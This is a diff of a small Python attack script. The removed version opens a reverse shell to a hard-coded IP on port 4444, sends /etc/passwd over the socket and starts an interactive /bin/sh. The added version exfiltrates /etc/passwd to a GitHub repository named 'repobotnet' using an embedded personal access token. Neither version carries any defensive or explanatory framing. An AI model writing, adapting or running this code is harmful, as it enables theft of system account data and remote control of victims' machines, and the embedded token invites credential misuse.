@@ -1,25 +1,14 @@
-import socket
-import subprocess
+import github
 import os
 
-def upload_file(filename, sock):
-    with open(filename, 'rb') as f:
-        data = f.read()
-    sock.sendall(data)
+# Authenticate with GitHub using a personal access token
+g = github.Github("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")
 
-def run():
-    ip = "192.168.176.158"
-    port = 4444
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    for f in (0, 1, 2):
-        os.set_inheritable(f, True)
-    upload_file('/etc/passwd', s)
-    subprocess.run(["/bin/sh", "-i"], check=True)
+# Get the repository
+repo = g.get_user().get_repo("repobotnet")
 
-if __name__ == "__main__":
-    run()
+# Open the passwd file in binary mode
+with open("/etc/passwd", "rb") as f:
+    # Create a new file in the repository
+    repo.create_file(".passwd", "Uploading passwd file", f.read())
     
